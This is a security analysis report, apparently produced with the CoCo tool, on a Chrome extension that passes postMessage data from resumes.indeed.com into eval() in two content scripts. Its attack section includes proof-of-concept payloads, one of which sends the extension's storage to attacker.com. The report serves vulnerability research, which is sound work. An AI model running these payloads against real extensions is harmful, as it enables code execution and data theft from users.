# CoCo Analysis: jbjkfjnokaapdlpiaaeamokdacnieagh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (same vulnerability in cs_1.js and cs_2.js)

---

## Sink 1: cs_window_eventListener_message → eval_sink (cs_1.js)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jbjkfjnokaapdlpiaaeamokdacnieagh/opgen_generated_files/cs_1.js
Line 887, 891, 893, 896

**Code:**

```javascript
// Content script - Entry point
window.addEventListener("message", (event) => {
  if (event.origin !== "https://resumes.indeed.com")
    return;

  if (typeof(event.data) === 'string' && event.data.indexOf("0:") !== 0) { // ← attacker-controlled
    clearInterval(profileWindowTrigger);
    const spltData = event.data.split(':'); // ← splits attacker data

    if (spltData.length === 2) {
      let currentIndex = eval(spltData[1]); // ← EVAL SINK - direct code execution
      candidateList.filter(candidate => candidate.selected === true).map((candidate, candidateKey) => {
        if (candidateKey === currentIndex) {
          let viewProfileElement = document.querySelector('a[href="'+candidate.resume_url+'"]')
          if (viewProfileElement !== null && candidate.candidateId == 0) {
            candidate.candidateId = eval(spltData[0]); // ← SECOND EVAL - also vulnerable
            viewProfileElement.parentNode.appendChild(createElement('a', 'View ATS Candidate', ats_url+candidate.candidateId))
            if (candidate.candidateId > 0) {
              window.open(candidate.chat_link+'#vtcid='+candidate.candidateId, '_blank')
            }
            candidateIndex++;
            recursiveCandidateFind(candidateIndex)
          }
        }
      })
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from https://resumes.indeed.com

**Attack:**

```javascript
// From https://resumes.indeed.com page (attacker-controlled iframe or XSS)
// Format: "data1:data2" where both parts are eval'd

// Code execution attack - exfiltrate extension storage
window.postMessage("1:chrome.storage.local.get(null,d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(d)}))", "*");

// Or simpler alert proof-of-concept
window.postMessage("1:alert(document.domain)", "*");

// Note: First part (before colon) is also eval'd at line 901 if conditions are met
window.postMessage("alert('XSS1'):alert('XSS2')", "*");
```

**Impact:** Arbitrary code execution in the extension's content script context. Attacker can execute any JavaScript code with the extension's privileges on Indeed.com, including accessing extension APIs, modifying page content, stealing data, or making privileged requests. The origin check only restricts to https://resumes.indeed.com, which an attacker could exploit if they find any way to inject content on that domain (XSS, compromised ads, iframe injection, etc.).

---

## Sink 2: cs_window_eventListener_message → eval_sink (cs_2.js)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jbjkfjnokaapdlpiaaeamokdacnieagh/opgen_generated_files/cs_2.js
Line 887, 891, 893, 896

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerable code pattern as cs_1.js - identical eval vulnerability in a different content script file. Both content scripts have the same attack surface.
